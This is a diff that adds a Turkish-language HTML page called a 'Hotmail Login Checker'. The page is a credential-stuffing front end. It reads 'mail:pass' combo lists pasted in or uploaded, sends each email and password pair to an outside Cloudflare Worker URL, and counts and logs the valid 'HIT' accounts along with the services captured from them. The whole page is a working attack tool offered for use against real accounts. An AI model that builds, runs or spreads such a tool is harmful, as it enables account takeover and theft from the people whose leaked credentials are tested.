@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CHECKERTURKEY | Real Hotmail Checker</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body { background-color: #050505; color: #ececec; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        .glass { background: rgba(20, 20, 20, 0.95); border: 1px solid rgba(255, 0, 0, 0.1); }
+        .console-box { background: #000; font-family: monospace; height: 300px; overflow-y: auto; border: 1px solid #222; }
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-thumb { background: #ff0000; }
+    </style>
+</head>
+<body>
+    <nav class="p-6 border-b border-white/5 text-center">
+        <h1 class="text-2xl font-bold tracking-tighter">CHECKER<span class="text-red-600">TURKEY</span></h1>
+    </nav>
+
+    <main class="max-w-4xl mx-auto p-6 mt-10">
+        <div class="glass p-8 rounded-3xl shadow-2xl">
+            <h2 class="text-center text-xl mb-6 font-bold uppercase tracking-widest text-red-600">Hotmail Login Checker</h2>
+            
+            <textarea id="comboList" class="w-full h-48 bg-black border border-white/10 rounded-xl p-4 text-sm focus:outline-none focus:border-red-600 mb-4" placeholder="mail:pass formatında girin..."></textarea>
+            
+            <div class="flex flex-wrap gap-4 mb-8">
+                <input type="file" id="fileInp" class="hidden">
+                <button onclick="document.getElementById('fileInp').click()" class="bg-zinc-900 px-6 py-3 rounded-xl text-xs font-bold hover:bg-zinc-800 transition-all">DOSYA YÜKLE</button>
+                <button id="startBtn" class="flex-1 bg-red-600 px-6 py-3 rounded-xl text-xs font-bold hover:bg-red-700 transition-all">BAŞLAT</button>
+                <button id="stopBtn" class="bg-zinc-800 px-6 py-3 rounded-xl text-xs font-bold">DURDUR</button>
+            </div>
+
+            <div class="grid grid-cols-3 gap-4 mb-8 text-center">
+                <div class="bg-black/50 p-4 rounded-2xl"><p class="text-[10px] text-gray-500">HIT</p><p id="hitCnt" class="text-xl font-bold text-green-500">0</p></div>
+                <div class="bg-black/50 p-4 rounded-2xl"><p class="text-[10px] text-gray-500">BAD</p><p id="badCnt" class="text-xl font-bold text-red-500">0</p></div>
+                <div class="bg-black/50 p-4 rounded-2xl"><p class="text-[10px] text-gray-500">CHECKED</p><p id="totalCnt" class="text-xl font-bold text-blue-500">0</p></div>
+            </div>
+
+            <div id="console" class="console-box p-4 text-[11px] leading-relaxed">
+                <p class="text-gray-600">> Sistem hazır. Worker bağlantısı bekleniyor...</p>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        let isRunning = false;
+        // BURAYA CLOUDFLARE WORKER URL'Nİ GELECEK
+        const WORKER_URL = "https://hesapcomtr295.workers.dev"; 
+
+        document.getElementById('fileInp').addEventListener('change', function(e) {
+            const reader = new FileReader();
+            reader.onload = () => document.getElementById('comboList').value = reader.result;
+            reader.readAsText(e.target.files[0]);
+        });
+
+        document.getElementById('startBtn').addEventListener('click', async () => {
+            const combos = document.getElementById('comboList').value.split('\n').filter(x => x.includes(':'));
+            if(combos.length === 0) return alert("Liste boş!");
+            
+            isRunning = true;
+            for(let combo of combos) {
+                if(!isRunning) break;
+                const [email, pass] = combo.split(':');
+                updateLog(`Kontrol ediliyor: ${email}`, 'gray');
+
+                try {
+                    const res = await fetch(WORKER_URL, {
+                        method: 'POST',
+                        body: JSON.stringify({ email, pass })
+                    });
+                    const data = await res.json();
+
+                    if(data.status === "HIT") {
+                        updateLog(`HIT! ${email}:${pass} | Servisler: ${data.capture}`, 'green');
+                        document.getElementById('hitCnt').innerText = parseInt(document.getElementById('hitCnt').innerText) + 1;
+                    } else {
+                        updateLog(`BAD: ${email}`, 'red');
+                        document.getElementById('badCnt').innerText = parseInt(document.getElementById('badCnt').innerText) + 1;
+                    }
+                } catch(e) {
+                    updateLog(`HATA: Worker'a bağlanılamadı!`, 'red');
+                }
+                document.getElementById('totalCnt').innerText = parseInt(document.getElementById('totalCnt').innerText) + 1;
+            }
+        });
+
+        document.getElementById('stopBtn').addEventListener('click', () => isRunning = false);
+
+        function updateLog(msg, color) {
+            const p = document.createElement('p');
+            if(color === 'green') p.className = "text-green-500 font-bold border-l-2 border-green-500 pl-2 my-1";
+            if(color === 'red') p.className = "text-red-400 opacity-70";
+            if(color === 'gray') p.className = "text-gray-500";
+            p.innerHTML = `> ${msg}`;
+            const console = document.getElementById('console');
+            console.prepend(p);
+        }
+    </script>
+</body>
+</html>
+
